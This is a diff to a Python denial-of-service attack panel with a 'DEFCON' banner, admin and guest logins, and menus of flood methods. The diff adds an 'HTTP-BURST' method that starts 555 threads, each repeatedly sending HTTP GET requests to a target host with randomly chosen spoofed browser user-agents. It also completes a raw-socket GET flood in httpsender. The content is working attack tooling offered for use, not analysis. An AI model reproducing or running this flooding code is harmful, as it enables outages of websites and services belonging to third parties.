@@ -30,6 +30,7 @@ method = """\033[91m
 ║ \033[00mBNET <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m USE INFO CMD\033[91m ║
 ║ \033[00mNULL <HOST> <PORT> <TIMEOUT>        \033[91m   | \033[00m CNUKE ATTACK\033[91m ║
 ║ \033[00mSPIKE <HOST> <PORT> <TIMEOUT>        \033[91m  | \033[00m CHTTP ATTACK\033[91m ║
+║ \033[00mHTTP-BURST <HOST'S IP>    <TIMEOUT> \033[91m   | \033[00m HTTP  ATTACK\033[91m ║
 ║═══════════════════════FREE═METHOD══════════════════════║              
 ║ \033[00mSYN  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m  |\033[00m SYN  ATTACK\033[91m   ║
 ╚════════════════════════════════════════════════════════╝\033[00m
@@ -135,6 +136,28 @@ syn = True
 icmp = True
 std = True
 totalThr = []
+
+
+user_agent = [
+  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
+  "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
+  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
+  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
+  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
+  "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
+  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
+  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
+       ]
 class Master:
  
     def __init__(self, grade):
@@ -304,7 +327,24 @@ def stdsender(host, port, timer, punch):
     iaid -= 1
     tattacks -=1
     aid -= 1
- 
+
+def httpmethod(host, timer):
+    global haid
+    global icmp
+    global aid
+    global tattacks
+    timeout = time.time() + float(timer)
+    while time.time() < timeout:
+        try:
+            while time.time() < timeout:
+                headers={'User-Agent': random.choice(user_agent)}
+                r = requests.get("http://"+host,headers=headers)
+        except BrokenPipeError:
+             print("Pipe Error")
+
+
+
+
 def httpsender(host, port, timer):
     global haid
     global icmp
@@ -313,7 +353,26 @@ def httpsender(host, port, timer):
  
     timeout = time.time() + float(timer)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while time.time() < timeout and attack:
+        try:
+            sock.send( f'GET / HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode() )
+        except TimeoutError:
+            sock.close()
+            break
+        except ConnectionRefusedError:
+            print("Wrong Port If Its A Https Ip Use port 443 else use port 80 or host offline.")
+            break
+        except socket.error:
+            continue
+        
+            
     
+         #sock.sendto(payload, (host, int(port)))
+        #sock.sendto(punch, (host, int(port)))
+    sock.close()
+    totalThr.clear()
+    haid -= 1
+    aid -= 1
 
     #haid += 1
     #aid += 1
@@ -669,6 +728,28 @@ def main():
                 except socket.gaierror:
                     print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
                     main()
+        elif sinput == "http-burst":
+            if username == "guest":
+                print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
+                main()
+            else:
+                try:
+                    sinput, host, timer = sin.split(" ")
+                    socket.gethostbyname(host)
+                    payload = "GET / HTTP/1.0\r\n\r\n"
+                    #print ("Attack sent to: {}".format (host))
+                    sp("Sending Http-Burst Attack This Will Take A Bit To Fully Send...")
+                    for i in range(555):
+                        thr = threading.Thread(target=httpmethod, args=(host, timer))
+                        thr.start()
+                        totalThr.append(thr)
+                    print(f"""Attack Sent!\nThreads: 5\nBots Used:0\nServers Used: 1\nCon Used: {tattacks + 1}\nMethod Type: VIP""")
+                except ValueError:
+                    print ("[\033[91mGHST\033[00m] The command {} requires an argument".format (sinput))
+                    main()
+                except socket.gaierror:
+                    print ("[\033[91mGHST\033[00m] Host: {} invalid".format (host))
+                    main()
         elif sinput == "icmp":
             if username == "guest":
                 print ("[\033[91mGHST\033[00m] You are not allowed to use this method")
@@ -761,7 +842,7 @@ try:
     password = getpass.getpass ("[+] Password: ")
     if user == "root":
         if password == passwords[0]:
-            print ("[+] Login correct, GRADE: ADMIN")
+            sp(f"[{Style.BRIGHT}{Fore.GREEN}+{Style.NORMAL}{Fore.RESET}] Login correct, GRADE: {Style.BRIGHT}{Fore.MAGENTA}ADMIN{Style.NORMAL}{Fore.RESET}")
             grade = "ADMIN"
             cookie.write("DIE")
             time.sleep(2)
@@ -769,7 +850,7 @@ try:
             banner = f"""
 ▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
 ▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
-░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒       [- Username: {username} Grade: {grade} -]   - [ - Type  HELP For Commands  - ]   
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒       [- Username: {Style.BRIGHT}{username}{Style.NORMAL} Grade: {Style.BRIGHT}{grade}{Style.NORMAL} -]   - [ - Type  HELP For Commands  - ]   
 ░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                
 ░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
  ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
@@ -784,7 +865,7 @@ try:
                 banner = f"""
 ▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
 ▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
-░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒       [- Username: {username} Grade: {grade} -]   - [ - Type  HELP For Commands  - ]   
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒       [- Username:{Style.BRIGHT} {username}{Style.NORMAL} Grade: {Style.BRIGHT}{grade}{Style.NORMAL} -]   - [ - Type  HELP For Commands  - ]   
 ░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                
 ░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
  ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
@@ -805,7 +886,7 @@ try:
             exit()
     if user == "guest":
         if password == passwords[1]:
-            print ("[+] Login correct, GRADE: GUEST")
+            sp(fader(f"[{Fore.GREEN}{Style.BRIGHT}+{Style.NORMAL}{Fore.RESET}] Login correct, GRADE: {Fore.GREEN}{Style.BRIGHT}GUEST{Style.NORMAL}"))
             grade = "FREE"
             time.sleep(4)
             os.system (clear)
@@ -814,7 +895,7 @@ try:
                 banner = f"""
 ▓█████▄ ▓█████   █████▒▄████▄   ▒█████   ███▄    █    
 ▒██▀ ██▌▓█   ▀ ▓██   ▒▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █    
-░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒       [- Username: {username} Grade: {grade} -]   - [ - Type  HELP For Commands  - ]   
+░██   █▌▒███   ▒████ ░▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒       [- Username:{Style.BRIGHT} {username}{Style.NORMAL} Grade: {Style.BRIGHT}{grade}{Style.NORMAL} -]   - [ - Type  HELP For Commands  - ]   
 ░▓█▄   ▌▒▓█  ▄ ░▓█▒  ░▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒                
 ░▒████▓ ░▒████▒░▒█░   ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░   
  ▒▒▓  ▒ ░░ ▒░ ░ ▒ ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒    
